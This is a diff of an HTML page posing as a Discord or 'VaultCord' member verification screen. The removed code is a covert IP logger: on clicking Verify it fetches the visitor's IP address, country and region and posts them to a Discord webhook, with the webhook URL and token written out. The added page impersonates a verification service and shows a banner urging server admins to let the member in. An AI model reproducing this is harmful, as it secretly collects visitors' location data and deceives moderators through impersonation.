@@ -1,37 +1,123 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
-  <title>Verification</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Weryfikacja VaultCord</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+
+  body {
+    margin: 0; padding: 0;
+    background-color: #121212;
+    color: #eee;
+    font-family: 'Inter', sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+  }
+
+  .alert {
+    width: 100%;
+    background-color: #b71c1c;
+    color: #fff;
+    text-align: center;
+    padding: 12px 16px;
+    font-weight: 600;
+    font-size: 14px;
+  }
+
+  .container {
+    margin-top: 80px;
+    background: #1e1e1e;
+    padding: 30px 40px;
+    border-radius: 12px;
+    box-shadow: 0 0 20px rgba(120, 64, 255, 0.7);
+    width: 320px;
+    text-align: center;
+  }
+
+  .logo {
+    width: 70px;
+    height: 70px;
+    background-color: #5845f4;
+    border-radius: 50%;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 28px;
+    color: white;
+    text-shadow: 0 0 5px #9a7eff;
+    margin-bottom: 24px;
+    user-select: none;
+  }
+
+  h1 {
+    font-size: 20px;
+    margin: 0 0 8px 0;
+    font-weight: 700;
+  }
+
+  .subtitle {
+    color: #bbb;
+    font-size: 14px;
+    margin-bottom: 32px;
+  }
+
+  button {
+    background-color: #5845f4;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: 700;
+    font-size: 14px;
+    padding: 14px 24px;
+    cursor: pointer;
+    box-shadow: 0 0 12px #8c75ff;
+    transition: background-color 0.3s ease;
+    user-select: none;
+  }
+
+  button:disabled {
+    background-color: #3a2f70;
+    cursor: default;
+    box-shadow: none;
+  }
+
+  button:hover:not(:disabled) {
+    background-color: #7b69ff;
+  }
+</style>
 </head>
 <body>
-  <h2>🔐 Discord Verification</h2>
-  <button onclick="verify()">Verify</button>
 
-  <script>
-    async function verify() {
-      const ipData = await fetch("https://ipwho.is/")
-        .then(res => res.json());
+<div class="alert">
+  Your Discord server was misconfigured at this time, you should allow this member since he did nothing wrong.
+</div>
 
-      await fetch("https://discord.com/api/webhooks/1466608411389984912/zjweHDorJ_iVnl9-38EvwHrJMw_g1iYZN5bx16O797Mi7HAiZyNiRK2FBhYRe-7wNwCX", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          embeds: [{
-            title: "🌟 New Member Verification 🌟",
-            color: 65280,
-            fields: [
-              { name: "IP Address", value: ipData.ip || "unknown" },
-              { name: "Country", value: ipData.country || "unknown" },
-              { name: "Region", value: ipData.region || "unknown" }
-            ],
-            timestamp: new Date()
-          }]
-        })
-      });
+<div class="container">
+  <div class="logo">VC</div>
+  <h1>Serwer użytkownika McWrap</h1>
+  <div class="subtitle">Usługa świadczona przez VaultCord</div>
+  <button id="verifyBtn" disabled>Verify complete, close this site.</button>
+</div>
 
-      alert("Verification complete!");
-    }
-  </script>
+<script>
+  // Przykładowa logika – tu włączamy przycisk po 3 sekundach (możesz podpiąć swoją logikę)
+  const btn = document.getElementById('verifyBtn');
+  setTimeout(() => {
+    btn.disabled = false;
+    btn.textContent = 'Verify complete, close this site.';
+  }, 3000);
+
+  btn.addEventListener('click', () => {
+    alert('Verification complete! Możesz zamknąć stronę.');
+    window.close(); // Zamknie okno, jeśli działa (nie zawsze działa z ograniczeniami przeglądarek)
+  });
+</script>
+
 </body>
 </html>
+
